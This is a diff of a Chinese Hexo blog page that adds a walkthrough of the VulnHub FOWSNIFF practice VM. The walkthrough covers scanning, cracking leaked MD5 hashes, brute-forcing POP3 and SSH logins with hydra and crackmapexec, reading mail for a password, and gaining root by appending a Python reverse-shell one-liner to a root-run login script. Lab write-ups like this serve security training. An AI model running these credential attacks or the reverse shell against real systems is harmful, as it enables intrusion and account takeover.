@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>子夜旅馆</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="子夜旅馆">
+  <title>vulnhub-FOWSNIFF靶机 | 子夜旅馆</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="vulnhub-FOWSNIFF靶机 | 子夜旅馆">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="子夜旅馆">
 <meta property="og:type" content="website">
@@ -56,7 +56,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -607,12 +607,60 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-ea07962bb935eb90f975ba42cdf7adb2" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AD%90%E5%A4%9C%E6%97%85%E9%A6%86"><span class="toc-text">关于子夜旅馆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
+        <h1 class="article-title">vulnhub-FOWSNIFF靶机</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="渗透">渗透</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">靶场</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-12-03 18:51:26'>2023-03-29 18:14</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:955</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-FOWSNIFF-1-%E5%A4%84%E7%90%86%E5%AE%8C%E6%AF%95"><span class="toc-text">vulnhub-FOWSNIFF:1(处理完毕)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-text">0x01 下载地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%9D%B6%E6%9C%BA%E7%9B%AE%E6%A0%87"><span class="toc-text">0x02 靶机目标</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-text">0x03 工具准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4"><span class="toc-text">0x04 详细步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">一、主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">二、端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">三、Web 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0-%E8%AE%BF%E9%97%AE-80-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.0 访问 80 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%B0%9D%E8%AF%95%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">3.1 尝试密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-text">3.2 目录爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81pop3-%E6%B5%8B%E8%AF%95"><span class="toc-text">四、pop3 测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8%E5%B7%B2%E7%9F%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">4.1 利用已知账号密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-pop3-%E7%99%BB%E5%BD%95"><span class="toc-text">4.2 pop3 登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81ssh-%E6%94%BB%E5%87%BB"><span class="toc-text">五、ssh 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%96%B0%E5%BE%97%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8A%A0%E5%85%A5%E5%AD%97%E5%85%B8%EF%BC%8C%E5%B9%B6%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%88%86%E7%A0%B4"><span class="toc-text">将新得到的密码加入字典，并进一步爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95-ssh"><span class="toc-text">登录 ssh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">六、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-ssh-%E7%99%BB%E9%99%86%E4%B8%8A%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">对 ssh 登陆上的主机信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">七、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E5%B0%9D%E8%AF%95%E5%8F%8D%E5%BC%B9-shell"><span class="toc-text">7.1 尝试反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E5%8A%A0%E5%9B%BA-nc-%E7%9A%84-shell-%E5%B9%B6%E8%8E%B7%E5%BE%97-flag"><span class="toc-text">7.2 加固 nc 的 shell,并获得 flag</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -625,38 +673,195 @@
     }
 </style>
 </div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="vulnhub-FOWSNIFF-1-处理完毕"><a href="#vulnhub-FOWSNIFF-1-处理完毕" class="headerlink" title="vulnhub-FOWSNIFF:1(处理完毕)"></a>vulnhub-FOWSNIFF:1(处理完毕)</h1><h1 id="0x01-下载地址"><a href="#0x01-下载地址" class="headerlink" title="0x01 下载地址"></a>0x01 下载地址</h1><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/fowsniff/Fowsniff_CTF_ova.7z">https://download.vulnhub.com/fowsniff/Fowsniff_CTF_ova.7z</a></p>
+<h1 id="0x02-靶机目标"><a href="#0x02-靶机目标" class="headerlink" title="0x02 靶机目标"></a>0x02 靶机目标</h1><p>获得 root 权限+flag.txt 一个</p>
+<h1 id="0x03-工具准备"><a href="#0x03-工具准备" class="headerlink" title="0x03 工具准备"></a>0x03 工具准备</h1><h1 id="0x04-详细步骤"><a href="#0x04-详细步骤" class="headerlink" title="0x04 详细步骤"></a>0x04 详细步骤</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><ol>
+<li>arp-scan -I eth1 -l    //-I   指定网卡</li>
+</ol>
 <blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
+<p>192.168.56.103  08:00:27:66:85:17       PCS Systemtechnik GmbH</p>
 </blockquote>
-<blockquote>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-</blockquote>
-<blockquote>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于子夜旅馆"><a href="#关于子夜旅馆" class="headerlink" title="关于子夜旅馆"></a>关于子夜旅馆</h2><p><strong>子夜旅馆</strong> 是我的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 生成，部署在 <a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>主题 <a target="_blank" rel="noopener" href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
-<p><code>3-hexo</code> 主题使用交流可以加 Q群: <a target="_blank" href="//shang.qq.com/wpa/qunwpa?idkey=e8cf083cc097141eaf323396f1766809b8e90ff00c67bb441898f672892f6904"><img data-ignore border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="3-hexo使用交流" title="3-hexo使用交流"></a></p>
-<p>主要功能：</p>
+<h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><ol>
+<li> sudo nmap  –min-rate 10000 -p- 192.168.56.103</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301319723.png#alt=image-20230329211917761"></p>
+<ol start="2">
+<li> sudo nmap -sT -sV -O -p 22,80,110,143 192.168.56.103</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301319656.png#alt=image-20230329212031601"></p>
+<h2 id="三、Web-信息收集"><a href="#三、Web-信息收集" class="headerlink" title="三、Web 信息收集"></a>三、Web 信息收集</h2><h3 id="3-0-访问-80-信息收集"><a href="#3-0-访问-80-信息收集" class="headerlink" title="3.0 访问 80 信息收集"></a>3.0 访问 80 信息收集</h3><p>##打开 80 端口 web 页面，得知数据泄露<a href="/fowsniffcorp">@fowsniffcorp </a> Twitter</p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301036303.png#alt=image-20230330103653061"></p>
+<p>##谷歌搜<a href="/fowsniffcorp">@fowsniffcorp </a> Twitter</p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301042029.png#alt=image-20230330104017343"></p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301042635.png#alt=image-20230330104156320"><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301043949.png#alt=image-20230330104304508"></p>
+<pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+</code></pre>
+<h3 id="3-1-尝试密码破解"><a href="#3-1-尝试密码破解" class="headerlink" title="3.1 尝试密码破解"></a>3.1 尝试密码破解</h3><ol>
+<li>转存 hash 为 1.txt</li>
+<li>利用 hash-identifier 来判断是什么 hash</li>
+</ol>
+<pre><code>hash-identifier 8a28a94a588a95b80163709ab4313aa4
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301051021.png#alt=image-20230330105022365"></p>
+<ol start="3">
+<li>尝试爆破密码</li>
+</ol>
+<pre><code>gzip -d /usr/share/wordlists/rockyou.txt.gz
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt 1.txt  &gt; 2
+</code></pre>
+<ol start="4">
+<li>转存字典</li>
+</ol>
+<pre><code>cat 2|awk -F&#39; &#39; &#39;&#123;print $1&#125;&#39; &gt; pass
+cat 2|awk -F&#39; &#39; &#39;&#123;print $2&#125;&#39; | awk -F&#39;@&#39; &#39;&#123;print $1&#125;&#39;|awk -F&#39;(&#39; &#39;&#123;print $2&#125;&#39; &gt; user
+//-F 指定分隔符
+</code></pre>
+<ol start="5">
+<li>尝试破解 ssh 登录</li>
+</ol>
+<pre><code>crackmapexec ssh 192.168.56.103 -u user -p pass  --continue-on-success   //成功后继续尝试
+</code></pre>
+<p>遗憾的是全部失败</p>
+<h3 id="3-2-目录爆破"><a href="#3-2-目录爆破" class="headerlink" title="3.2 目录爆破"></a>3.2 目录爆破</h3><ol>
+<li>中号字典试试</li>
+</ol>
+<pre><code> gobuster dir -u http://192.168.56.103 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301218681.png#alt=image-20230330113730412"></p>
+<ol start="2">
+<li>大号字典试试</li>
+</ol>
+<pre><code>gobuster dir -u http://192.168.56.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301218344.png#alt=image-20230330121557947"></p>
+<p>……还是没有，看来目录扫描路断了</p>
+<h2 id="四、pop3-测试"><a href="#四、pop3-测试" class="headerlink" title="四、pop3 测试"></a>四、pop3 测试</h2><h3 id="4-1-利用已知账号密码爆破"><a href="#4-1-利用已知账号密码爆破" class="headerlink" title="4.1 利用已知账号密码爆破"></a>4.1 利用已知账号密码爆破</h3><pre><code class="bash">hydra -L user -P pass -f 192.168.56.103 pop3    //-f 成功一次就结束
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301227159.png#alt=image-20230330122713319"></p>
+<p>seina    scoobydoo2</p>
+<h3 id="4-2-pop3-登录"><a href="#4-2-pop3-登录" class="headerlink" title="4.2 pop3 登录"></a>4.2 pop3 登录</h3><pre><code>nc 192.168.56.103 110
+user seina
+pass  scoobydoo2
+list
+retr 1
+retr 2
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301407358.png#alt=image-20230330122950925"></p>
 <ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a target="_blank" rel="noopener" href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
+<li>第一封邮件</li>
 </ul>
+<pre><code>Return-Path: &lt;stone@fowsniff&gt;
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+Dear All,
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are &quot;in the shop,&quot; we have
+moved to this isolated, temporary server that has minimal
+functionality.
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via
+the SSH protocol.
+The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+Come see me in my office at your earliest convenience and we&#39;ll set it up.
+Thanks,
+A.J Stone
+</code></pre>
+<p>有用的信息<code>S1ck3nBluff+secureshell</code></p>
+<h2 id="五、ssh-攻击"><a href="#五、ssh-攻击" class="headerlink" title="五、ssh 攻击"></a>五、ssh 攻击</h2><h3 id="将新得到的密码加入字典，并进一步爆破"><a href="#将新得到的密码加入字典，并进一步爆破" class="headerlink" title="将新得到的密码加入字典，并进一步爆破"></a>将新得到的密码加入字典，并进一步爆破</h3><pre><code>crackmapexec ssh 192.168.56.103 -u user -p &quot;S1ck3nBluff+secureshell&quot;  --continue-on-success
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301239460.png#alt=image-20230330123953414"></p>
+<ul>
+<li>获得 baksteen:S1ck3nBluff+secureshell 一组 ssh</li>
+</ul>
+<h3 id="登录-ssh"><a href="#登录-ssh" class="headerlink" title="登录 ssh"></a>登录 ssh</h3><pre><code class="bash">ssh baksteen@192.168.56.103
+baksteen:S1ck3nBluff+secureshell
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301243350.png#alt=image-20230330124308311"></p>
+<h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><h3 id="对-ssh-登陆上的主机信息收集"><a href="#对-ssh-登陆上的主机信息收集" class="headerlink" title="对 ssh 登陆上的主机信息收集"></a>对 ssh 登陆上的主机信息收集</h3><pre><code>whoami
+ifconfig
+id
+find / -user root -perm -4000 -print 2&gt;/dev/null
+sudo -l
+find / -group users -type f 2&gt;/dev/null       //发现/opt/cube/cube.sh文件每次ssh连接成功都会以root身份运行
+dpkg -l |grep python
+</code></pre>
+<h2 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h2><h3 id="7-1-尝试反弹-shell"><a href="#7-1-尝试反弹-shell" class="headerlink" title="7.1 尝试反弹 shell"></a>7.1 尝试反弹 shell</h3><ul>
+<li>在/opt/cube/cube.sh 追加</li>
+</ul>
+<pre><code>export RHOST=&quot;192.168.56.102&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;;
+</code></pre>
+<ul>
+<li>kali 监听<code>nc -nvlp 4444</code></li>
+<li>ssh 登录获得反弹 shell</li>
+</ul>
+<h3 id="7-2-加固-nc-的-shell-并获得-flag"><a href="#7-2-加固-nc-的-shell-并获得-flag" class="headerlink" title="7.2 加固 nc 的 shell,并获得 flag"></a>7.2 加固 nc 的 shell,并获得 flag</h3><pre><code class="bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+ctrl +z
+stty raw -echo;fg;reset
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301318611.png#alt=image-20230330131819278"></p>
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1210396142@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>vulnhub-FOWSNIFF靶机</p>
+    <p><span class="copy-title">字数:</span><span class="post-count">955</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="ziyebuku">ziyebuku</a></p>
+    <p><span class="copy-title">发布时间:</span>2023-03-29, 18:14:04</p>
+    <p><span class="copy-title">最后更新:</span>2023-12-03, 18:51:26</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2023/03/29/ea07962bb935eb90f975ba42cdf7adb2/" title="vulnhub-FOWSNIFF靶机">https://sunwu57.github.io/2023/03/29/ea07962bb935eb90f975ba42cdf7adb2/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#34;署名-非商用-相同方式共享 4.0&#34;</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
 <meta name="referrer" content="no-referrer" />
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -665,11 +870,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
